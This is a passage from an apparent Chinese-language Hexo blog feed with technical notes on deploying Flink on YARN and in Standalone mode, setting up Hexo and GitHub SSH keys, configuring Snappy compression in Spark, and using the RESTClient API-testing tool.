org.apache.flink.yarn.AbstractYarnClusterDescriptor           - Submitting application master application_1564366526843_1818</span><br><span class="line">2019-07-31 11:46:49,560 INFO  org.apache.hadoop.yarn.client.api.impl.YarnClientImpl         - Submitted application application_1564366526843_1818</span><br><span class="line">2019-07-31 11:46:49,560 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - Waiting for the cluster to be allocated</span><br><span class="line">2019-07-31 11:46:49,561 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - Deploying cluster, current state ACCEPTED</span><br><span class="line">2019-07-31 11:46:52,573 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - YARN application has been deployed successfully.</span><br><span class="line">2019-07-31 11:46:52,928 INFO  org.apache.flink.runtime.rest.RestClient                      - Rest client endpoint started.</span><br><span class="line">Flink JobManager is now running on datanode127:37898 with leader id 00000000-0000-0000-0000-000000000000.</span><br><span class="line">JobManager Web Interface: http://datanode127:37898</span><br><span class="line">^C2019-07-31 11:54:04,390 INFO  org.apache.flink.runtime.rest.RestClient                      - Shutting down rest endpoint.</span><br><span class="line">2019-07-31 11:54:04,392 INFO  org.apache.flink.runtime.rest.RestClient                      - Rest endpoint shutdown complete.</span><br><span class="line">2019-07-31 11:54:04,393 INFO  org.apache.flink.yarn.cli.FlinkYarnSessionCli                 - Deleted Yarn properties file at /tmp/.yarn-properties-root</span><br><span class="line">[root@datanode127 flink-1.8.1]# ^C</span><br><span class="line">[root@datanode127 flink-1.8.1]# bin/yarn-session.sh run -n 2 -tm 2048 -s 4</span><br><span class="line">2019-07-31 11:58:44,326 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: jobmanager.rpc.address, localhost</span><br><span class="line">2019-07-31 11:58:44,327 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: jobmanager.rpc.port, 6123</span><br><span class="line">2019-07-31 11:58:44,327 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: jobmanager.heap.size, 1024m</span><br><span class="line">2019-07-31 11:58:44,327 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: taskmanager.heap.size, 1024m</span><br><span class="line">2019-07-31 11:58:44,327 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: taskmanager.numberOfTaskSlots, 1</span><br><span class="line">2019-07-31 11:58:44,327 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: parallelism.default, 1</span><br><span class="line">2019-07-31 11:58:44,779 INFO  org.apache.flink.runtime.security.modules.HadoopModule        - Hadoop user set to root (auth:SIMPLE)</span><br><span class="line">2019-07-31 11:58:44,837 INFO  org.apache.hadoop.yarn.client.RMProxy                         - Connecting to ResourceManager at datanode127/172.16.0.127:8032</span><br><span class="line">2019-07-31 11:58:45,046 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - Cluster specification: ClusterSpecification&#123;masterMemoryMB=1024, taskManagerMemoryMB=1024, numberTaskManagers=1, slotsPerTaskManager=1&#125;</span><br><span class="line">2019-07-31 11:58:45,286 WARN  org.apache.hadoop.util.NativeCodeLoader                       - Unable to load native-hadoop library for your platform... using builtin-java classes where applicable</span><br><span class="line">2019-07-31 11:58:45,300 WARN  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - The configuration directory ('/data2/flink/flink-1.8.1/conf') contains both LOG4J and Logback configuration files. Please delete or rename one of them.</span><br><span class="line">2019-07-31 11:58:46,808 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - Submitting application master application_1564366526843_1821</span><br><span class="line">2019-07-31 11:58:46,828 INFO  org.apache.hadoop.yarn.client.api.impl.YarnClientImpl         - Submitted application application_1564366526843_1821</span><br><span class="line">2019-07-31 11:58:46,828 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - Waiting for the cluster to be allocated</span><br><span class="line">2019-07-31 11:58:46,829 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - Deploying cluster, current state ACCEPTED</span><br><span class="line">2019-07-31 11:58:50,594 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - YARN application has been deployed successfully.</span><br><span class="line">2019-07-31 11:58:50,961 INFO  org.apache.flink.runtime.rest.RestClient                      - Rest client endpoint started.</span><br><span class="line">Flink JobManager is now running on datanode127:35550 with leader id 00000000-0000-0000-0000-000000000000.</span><br><span class="line">JobManager Web Interface: http://datanode127:35550</span><br></pre></td></tr></table></figure><p>开启之后 最后会给一个WebUI的地址,经过多次发现on yarn模式下,这个端口是随机分配的.</p><h3 id="wordcount"><a href="#wordcount" class="headerlink" title="wordcount"></a>wordcount</h3><p>使用IDEA创建新的Maven项目,写一个简单的wordcount</p><p>在Flink Web UI中创建一个简单的任务:</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g5j27shu1lj210s0n7wg8.jpg" alt></p><p>选中Submit new Job,把打好的Jar包上传进去,可以在这个界面选择需要传入的args</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g5j29biz46j20sx0b0aac.jpg" alt></p><p>传完参数之后就可以运行了,任务的日志和记录也都可以在上面找到.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g5j2aapan1j20sq0393yj.jpg" alt></p><p>点进去就可以看到任务的记录.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g5j2bhs8m3j210s0n7wh5.jpg" alt></p><p>这就是Flink on yarn的部署方式之Flink YARN Session.</p><h3 id="Standalone"><a href="#Standalone" class="headerlink" title="Standalone"></a>Standalone</h3><p>目前大多数企业使用应该还是使用Standalone模式的,从官方发行版本不再包含yarn的jar包就可以看出,Flink团队应该也不是特别喜欢yarn对资源的调度,在Standalone模式里面,我们可以自己配置Flink的资源使用.</p><p>安装 解压都和上面一样,主要区别在与Standalone模式要修改flink配置文件.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jobmanager.rpc.address: localhost1   --jobManager 的IP地址</span><br><span class="line">jobmanager.rpc.port: 6123   --jobManager 的端口，默认为6123</span><br><span class="line">jobmanager.heap.mb --jobManager 的JVM heap大小 </span><br><span class="line">taskmanager.heap.mb  --taskManager的jvm heap大小设置</span><br><span class="line">taskmanager.numberOfTaskSlots  --taskManager中taskSlots个数，最好设置成work节点的CPU个数相等</span><br><span class="line">parallelism.default  --并行计算数</span><br><span class="line">fs.default-scheme --文件系统来源</span><br><span class="line">fs.hdfs.hadoopconf:  --hdfs置文件路径</span><br><span class="line">jobmanager.web.port    -- jobmanager的页面监控端口</span><br></pre></td></tr></table></figure><p>配置完成后,就可以直接启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./start-cluster.sh</span><br></pre></td></tr></table></figure><p>停止脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./stop-cluster.sh</span><br></pre></td></tr></table></figure><p>直接浏览器访问页面＋管理web 端口</p><p>localhost:8081</p><p>这里涉及的配置文件比较多,上面只标出了几个比较重要的,需要使用的时候(如配置HA)还是要看最新的<a href="https://ci.apache.org/projects/flink/flink-docs-stable/release-notes/flink-1.8.html" target="_blank" rel="noopener">官方文档</a>.</p><hr><p>下图展示了 Flink 中目前支持的主要几种流的类型，以及它们之间的转换关系。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g5t5ry2zvmj20nb0d70u3.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Flink集群搭建&quot;&gt;&lt;a href=&quot;#Flink集群搭建&quot; class=&quot;headerlink&quot; title=&quot;Flink集群搭建&quot;&gt;&lt;/a&gt;Flink集群搭建&lt;/h1&gt;
    
    </summary>
    
      <category term="Flink" scheme="http://yoursite.com/categories/Flink/"/>
    
    
      <category term="Flink" scheme="http://yoursite.com/tags/Flink/"/>
    
  </entry>
  
  <entry>
    <title>Hexo Conf</title>
    <link href="http://yoursite.com/2019/08/02/%E6%96%B0%E7%94%B5%E8%84%91%E9%85%8D%E7%BD%AEHexo/"/>
    <id>http://yoursite.com/2019/08/02/新电脑配置Hexo/</id>
    <published>2019-08-02T03:53:28.353Z</published>
    <updated>2019-08-02T03:58:57.453Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>新电脑配置Hexo的方法备用,仅限个人</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g5l74xxdnaj20o308umxm.jpg" alt></p><a id="more"></a> <p>After My download from OneDrive.</p><ol><li><p>Node.js</p></li><li><p>Git</p></li><li><p>Hexo</p></li><li><ol><li>Under the installation directory</li><li>Git Bash</li><li>Npm install hexo -cli -g</li><li>SSH Key to Github</li><li>OK</li></ol></li></ol><p>SSH Key to Github</p><p>git config –global user.name “FlyMeToTheMars”<br> git config –global user.email <a href="mailto:flyhobo@live.com" target="_blank" rel="noopener">flyhobo@live.com</a></p><p>ssh-keygen -t rsa -C  <a href="mailto:flyhobo@live.com" target="_blank" rel="noopener">flyhobo@live.com</a></p><p>(file in C:\Users\Administrator.ssh) </p><p>Then upload to github.com with website</p><p>Test:</p><p>ssh <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;新电脑配置Hexo的方法备用,仅限个人&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/bec9bff2ly1g5l74xxdnaj20o308umxm.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Env" scheme="http://yoursite.com/categories/Env/"/>
    
    
      <category term="Hexo" scheme="http://yoursite.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Compression Code</title>
    <link href="http://yoursite.com/2019/07/16/Snappy/"/>
    <id>http://yoursite.com/2019/07/16/Snappy/</id>
    <published>2019-07-16T02:55:41.588Z</published>
    <updated>2019-07-16T06:27:57.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Snappy"><a href="#Snappy" class="headerlink" title="Snappy"></a>Snappy</h2><p>Snappy使用C++ 开发的压缩和解压缩开发包，只在提供高速压缩速度和合理压缩率。</p><p>主要是用内存空间换压缩速度，2015年的i7大概能提供250-500M的压缩速度。</p><a id="more"></a> <h4 id="Spark取消CSV文件输出默认的Snappy压缩格式："><a href="#Spark取消CSV文件输出默认的Snappy压缩格式：" class="headerlink" title="Spark取消CSV文件输出默认的Snappy压缩格式："></a>Spark取消CSV文件输出默认的Snappy压缩格式：</h4><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> spark = <span class="type">SparkSession</span>.builder().appName(<span class="string">"sparktoDisk"</span>).enableHiveSupport().getOrCreate()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spark2之后都是直接用SparkSession,对于之前的Conf中的属性用下面的格式设置。 压缩选项可以设置两个，分别是map阶段和reduce阶段的.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//对map输出的内容进行压缩</span></span><br><span class="line">spark.conf.set(<span class="string">"mapred.compress.map.output"</span>,<span class="string">"true"</span>);</span><br><span class="line">spark.conf.set(<span class="string">"mapred.map.output.compression.codec"</span>,<span class="string">"org.apache.hadoop.io.compress.SnappyCodec"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//对reduce输出的内容进行压缩</span></span><br><span class="line">spark.conf.set(<span class="string">"mapred.output.compress"</span>,<span class="string">"true"</span>);</span><br><span class="line">spark.conf.set(<span class="string">"mapred.output.compression"</span>,<span class="string">"org.apache.hadoop.io.compress.SnappyCodec"</span>);</span><br></pre></td></tr></table></figure><h4 id="DF保存为CSV"><a href="#DF保存为CSV" class="headerlink" title="DF保存为CSV"></a>DF保存为CSV</h4><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.coalesce(<span class="number">1</span>).write.option(<span class="string">"header"</span>,<span class="string">"true"</span>).csv(<span class="string">"sample_file.csv"</span>)</span><br></pre></td></tr></table></figure><h4 id="使用Lib包压索解压文件"><a href="#使用Lib包压索解压文件" class="headerlink" title="使用Lib包压索解压文件"></a>使用Lib包压索解压文件</h4><p><a href="https://blog.csdn.net/lucien_zong/article/details/17071401" target="_blank" rel="noopener">CSDN链接</a></p><h4 id="Python解压snappy文件"><a href="#Python解压snappy文件" class="headerlink" title="Python解压snappy文件"></a>Python解压snappy文件</h4><ol><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ./get-pip.py</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc-c++</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install python-snappy</span><br></pre></td></tr></table></figure></li></ol><h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><h5 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m snappy -c uncompressed_file compressed_file.snappy</span><br></pre></td></tr></table></figure><h5 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m snappy -d compressed_file.snappy uncompressed_file</span><br></pre></td></tr></table></figure><h3 id="阿里云文档说明"><a href="#阿里云文档说明" class="headerlink" title="阿里云文档说明"></a>阿里云文档说明</h3><p>阿里云对这些整理的很细致啊，是个找资料的好地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.alibabacloud.com/help/zh/doc-detail/108942.htm</span><br></pre></td></tr></table></figure><p>同时还有别的压缩格式的介绍，很详细。</p><p>文档中心-&gt;数据投递-&gt;投递日志到OSS-&gt;Snappy</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Snappy&quot;&gt;&lt;a href=&quot;#Snappy&quot; class=&quot;headerlink&quot; title=&quot;Snappy&quot;&gt;&lt;/a&gt;Snappy&lt;/h2&gt;&lt;p&gt;Snappy使用C++ 开发的压缩和解压缩开发包，只在提供高速压缩速度和合理压缩率。&lt;/p&gt;
&lt;p&gt;主要是用内存空间换压缩速度，2015年的i7大概能提供250-500M的压缩速度。&lt;/p&gt;
    
    </summary>
    
      <category term="Compression" scheme="http://yoursite.com/categories/Compression/"/>
    
      <category term="Spark" scheme="http://yoursite.com/categories/Compression/Spark/"/>
    
    
      <category term="Compression" scheme="http://yoursite.com/tags/Compression/"/>
    
  </entry>
  
  <entry>
    <title>ElasticSearch工具之RESTClient</title>
    <link href="http://yoursite.com/2019/06/27/ES%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7RESTClient%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/"/>
    <id>http://yoursite.com/2019/06/27/ES测试工具RESTClient使用说明/</id>
    <published>2019-06-27T05:52:59.953Z</published>
    <updated>2019-07-08T03:41:28.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ES简单测试工具</p></blockquote><a id="more"></a> <h1 id="1-使用RESTClient前的准备工作"><a href="#1-使用RESTClient前的准备工作" class="headerlink" title="1. 使用RESTClient前的准备工作"></a>1. 使用RESTClient前的准备工作</h1><h2 id="1-1-下载RESTClient"><a href="#1-1-下载RESTClient" class="headerlink" title="1.1 下载RESTClient"></a>1.1 下载RESTClient</h2><p>JAR包： [<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 1.2 使用前安装Java</span><br><span class="line"></span><br><span class="line">支持的Java版本 **&gt;=1.7**</span><br><span class="line"></span><br><span class="line">## 1.3 启动RESTClient软件</span><br><span class="line"></span><br><span class="line">双击[```restclient.jar```](https://github.com/Wisdom-Projects/rest-client/blob/master/tools)，或者执行命令```java -jar restclient.jar```启动RESTClient软件。</span><br><span class="line"></span><br><span class="line">RESTClient主窗体包含： </span><br><span class="line"></span><br><span class="line">+ 请求视图（Request）</span><br><span class="line">+ 响应视图（Response）</span><br><span class="line">+ 历史视图（History）</span><br><span class="line">+ 菜单栏（File, Edit, Test, Apidoc, Help）</span><br><span class="line"></span><br><span class="line"># 2. 使用RESTClient测试REST API步骤</span><br><span class="line"></span><br><span class="line">## 2.1 请求视图中输入REST API所需的请求数据</span><br><span class="line"></span><br><span class="line">在请求视图中对所测试的REST API输入的数据详情如下：</span><br><span class="line"></span><br><span class="line">### 2.1.1 选择请求方法</span><br><span class="line"></span><br><span class="line">RESTClient支持请求方法详情如下： </span><br><span class="line"></span><br><span class="line">方法名 |操作|备注</span><br><span class="line">------|---|--------------</span><br><span class="line">GET   |查询|无需要填写请求体</span><br><span class="line">POST  |添加|</span><br><span class="line">PUT   |修改|</span><br><span class="line">DELETE|删除|无需要填写请求体</span><br><span class="line"></span><br><span class="line">### 2.1.2 输入访问REST API的URL</span><br><span class="line"></span><br><span class="line">+ URL格式： ```HTTP协议://主机名:端口号/路径</span><br></pre></td></tr></table></figure></p><ul><li>URL示例： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 2.1.3 输入请求体(Body)</span><br><span class="line"></span><br><span class="line">如果选择的请求方法是**POST**或者**PUT**则可以填写请求体，**其他方法则无需填写**。</span><br><span class="line"></span><br><span class="line">#### 2.1.3.1 选择请求体类型（Body-Type）</span><br><span class="line"></span><br><span class="line">+ **字符串(String)**</span><br><span class="line"></span><br><span class="line">  直接在请求体的文本框中填写字符串；</span><br><span class="line"></span><br><span class="line">+ **文件(File)**</span><br><span class="line">  </span><br><span class="line">  浏览并选择地文本文件，文件内容会被读取并作为请求体。</span><br><span class="line"></span><br><span class="line">#### 2.1.3.2 选择内容类型（Content-Type）</span><br><span class="line"></span><br><span class="line">根据REST API消息体类型，对照下表，选择跟API匹配的内容类型，如果表中的内容类型都不是API所需要的类型，可以直接在内容类型文本框中**输入所需类型**。</span><br><span class="line">常见的内容类型详情如下：</span><br><span class="line"></span><br><span class="line">内容类型（Content-Type）           |数据格式</span><br><span class="line">---------------------------------|-------</span><br><span class="line">application/json                 |JSON</span><br><span class="line">application/xml                  |XML</span><br><span class="line">application/x-www-form-urlencoded|Form表单</span><br><span class="line">text/plain                       |纯文本</span><br><span class="line">text/xml                         |XML文本</span><br><span class="line">text/html                        |HTML文本</span><br><span class="line">multipart/form-data              |用于上传文件</span><br><span class="line">application/xhtml+xml            |XHTML</span><br><span class="line"></span><br><span class="line">### 2.1.4 选择字符集(Charset）</span><br><span class="line"></span><br><span class="line">默认字符集是**UTF-8**，可以选择REST API所需要的字符集，如果下拉列表里的字符集都不是API所需要的，可以直接在字符集文本框中**输入所需的字符集**。</span><br><span class="line"></span><br><span class="line">### 2.1.5 填写消息头(Header）</span><br><span class="line"></span><br><span class="line">可以根据REST API定义要求，以键值对的形式添加相应的消息头。</span><br><span class="line">Header键值对示例：</span><br></pre></td></tr></table></figure></li></ul><p>Key   ： Accept<br>Value ： application/json<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 2.1.6 填写Cookie</span><br><span class="line"></span><br><span class="line">可以根据REST API定义要求，以键值对的形式添加相应的Cookie。</span><br><span class="line">如果API需要登录认证，请先使用浏览器完成API登录认证成功后，将浏览器生成的JSESSIONID填写到Cookie中，这样就可以无需登录认证，直接访问REST API了，免登陆使用详情[**参考资料**](http://blog.wdom.net/article/9)。</span><br><span class="line">Cookie键值对示例：</span><br></pre></td></tr></table></figure></p><p>Key   ：JSESSIONID<br>Value : MY0REST1COOKIE2DEMO3<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 2.1.7 完整的请求数据示例</span><br><span class="line"></span><br><span class="line">填写完请求数据后点击Start按钮会触发API请求，在请求视图中输入完整的请求数据如图所示：</span><br><span class="line">![请求视图数据](http://blog.wdom.net/upload/2018/12/5am0qalk2egv9o7f6bsiglck34.png)</span><br><span class="line"></span><br><span class="line">## 2.2 响应视图中返回REST API响应的数据</span><br><span class="line"></span><br><span class="line">REST API请求完成后得到响应数据如下：</span><br><span class="line"></span><br><span class="line">+ 响应状态码（Status）</span><br><span class="line">+ 响应消息体（Body）</span><br><span class="line">+ 响应消息头（Header）</span><br><span class="line">+ 原始的响应数据（Raw）</span><br><span class="line"></span><br><span class="line">响应数据如图所示：</span><br><span class="line">![响应视图数据](http://blog.wdom.net/upload/2018/12/o3g9ecc474hhepvtec3e81hp36.png)</span><br><span class="line"></span><br><span class="line">## 2.3 历史视图中记录测试过的REST API</span><br><span class="line"></span><br><span class="line">在历史视图中可以对API进行的可视化编辑如下：</span><br><span class="line"></span><br><span class="line">+ 刷新API</span><br><span class="line">+ 对选中的API进行顺序调整</span><br><span class="line">+ 删除选中的API或者清空全部历史API</span><br><span class="line">+ 可以编辑选中的API</span><br><span class="line"></span><br><span class="line">历史API可视化编辑的快捷菜单如图所示：</span><br><span class="line">![API可视化编辑的快捷菜](http://blog.wdom.net/upload/2018/12/6brouneb90gkfomk7l94pn1bk9.png)</span><br><span class="line"></span><br><span class="line">## 2.4 对历史REST API进行再测试</span><br><span class="line"></span><br><span class="line">如果需要对历史API进行再测试，在RESTClient菜单栏点击 ```Test =&gt; Start Test</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.wdom.net/upload/2018/12/7off78b5naiuep54qr9s4jvfh7.png" alt="API再测试"></p><p>记录的历史API测试完成后，在Windows系统中会使用默认的浏览器打开测试报告。其他系统可以根据提示框中的报告路径，手动打开测试报告。<br>测试报告如图所示：<br><img src="http://blog.wdom.net/upload/2018/12/sq7mku6a0uhvrqk2gecvcvcsgf.png" alt="API测试报告"></p><h2 id="2-5-对历史REST-API生成API文档"><a href="#2-5-对历史REST-API生成API文档" class="headerlink" title="2.5 对历史REST API生成API文档"></a>2.5 对历史REST API生成API文档</h2><p>如果需要生成API文档，在RESTClient菜单栏点击 <code>Apidoc =&gt; Create</code><br><img src="http://blog.wdom.net/upload/2018/12/10qf6lnph6jcpri7tfuvdmhvs3.png" alt="生成API文档"></p><p>API文档生成完成后，在Windows系统中会使用默认的浏览器打开API文档。其他系统可以根据提示框中的文档路径，手动打开API文档。<br>API文档如图所示：<br><img src="http://blog.wdom.net/upload/2018/12/o07em8jbr6g6oqrtahs9f8f2ru.png" alt="API文档"></p><h2 id="2-6-对历史REST-API进行编辑"><a href="#2-6-对历史REST-API进行编辑" class="headerlink" title="2.6 对历史REST API进行编辑"></a>2.6 对历史REST API进行编辑</h2><p>为了满足API再测试要求或者满足API文档数据要求，可以对API进行如下操作：</p><ul><li>调整API顺序</li><li>删除冗余的、废弃的API</li><li>对API进行可视化编辑</li></ul><p>历史视图中选中API，快捷菜单中选择<code>Edit</code>打开API编辑窗体，如图所示：<br><img src="http://blog.wdom.net/upload/2018/12/3318v8o0dqhfrrj6p0ahtrdsvp.png" alt="API可视化编辑窗体"></p><p>在API编辑窗体中，可以编辑如下内容：</p><ul><li>请求方法</li><li>请求URL</li><li>请求头（Header）</li><li>请求体（Body）</li><li>响应状态码（Status）</li><li>响应的消息体（Text视图）</li><li>是否校验返回的消息体（Assert Body）</li></ul><p>默认勾选了<code>Assert Body</code>，API再测试会对返回的消息体进行完整匹配校验，如果不需要对返回的消息体进行匹配校验，可以去勾选。</p><p>如果返回的消息体中的某些JSON节点不需要进行再测试匹配校验，可以在<code>Viewer</code>视图上勾选排除这些节点，这样API再测试只对未排除的节点进行匹配校验。</p><h2 id="2-7-定制API文档"><a href="#2-7-定制API文档" class="headerlink" title="2.7 定制API文档"></a>2.7 定制API文档</h2><p>如果生成的API文档不能满足要求，需要改动，可以修改数据文件<code>work/apidoc/js/apidata.js</code>来定制API文档，API定制详情可以<a href="http://blog.wdom.net/article/10" target="_blank" rel="noopener"><strong>参考资料</strong></a>。</p><h2 id="2-8-通过命令行（CLI）方式使用RESTClient实现自动化测试REST-API"><a href="#2-8-通过命令行（CLI）方式使用RESTClient实现自动化测试REST-API" class="headerlink" title="2.8 通过命令行（CLI）方式使用RESTClient实现自动化测试REST API"></a>2.8 通过命令行（CLI）方式使用RESTClient实现自动化测试REST API</h2><p>RESTClient支持通过执行命令的方式启动和再测试API以及生成API文档，RESTClient CLI使用详情<a href="http://blog.wdom.net/article/6" target="_blank" rel="noopener"><strong>参考资料</strong></a>。</p><p>通过CLI方式，这样很容易在<strong>Jenkins</strong>中定时执行命令来调度RESTClient进行API再测试，从而实现<strong>自动化测试REST API</strong>和生成REST API文档。</p><h1 id="3-问题咨询与帮助"><a href="#3-问题咨询与帮助" class="headerlink" title="3. 问题咨询与帮助"></a>3. 问题咨询与帮助</h1><p>使用RESTClient过程中遇到问题可以查看RESTClient日志文件：<code>work/log/rest-client.log</code>，这样很容易排查出问题的具体原因。</p><p>更多的RESTClient使用示例，请参考<a href="http://blog.wdom.net/tag/RESTClient" target="_blank" rel="noopener"><strong>相关的技术资料</strong></a>来获得更多的使用示例和帮助。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;ES简单测试工具&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="ElasticSearch" scheme="http://yoursite.com/categories/ElasticSearch/"/>
    
      <category term="RESTClient" scheme="http://yoursite.com/categories/ElasticSearch/RESTClient/"/>
    
    
      <category term="ElasticSearch" scheme="http://yoursite.com/tags/ElasticSearch/"/>
    
      <category term="RESTClient" scheme="http://yoursite.com/tags/RESTClient/"/>
    
  </entry>
  
  <entry>
    <title>ElasticSearch</title>
    <link href="http://yoursite.com/2019/06/21/ElasticSearch/"/>
    <id>http://yoursite.com/2019/06/21/ElasticSearch/</id>
    <published>2019-06-21T01:50:00.143Z</published>
    <updated>2019-06-27T05:54:59.000Z</updated>
    
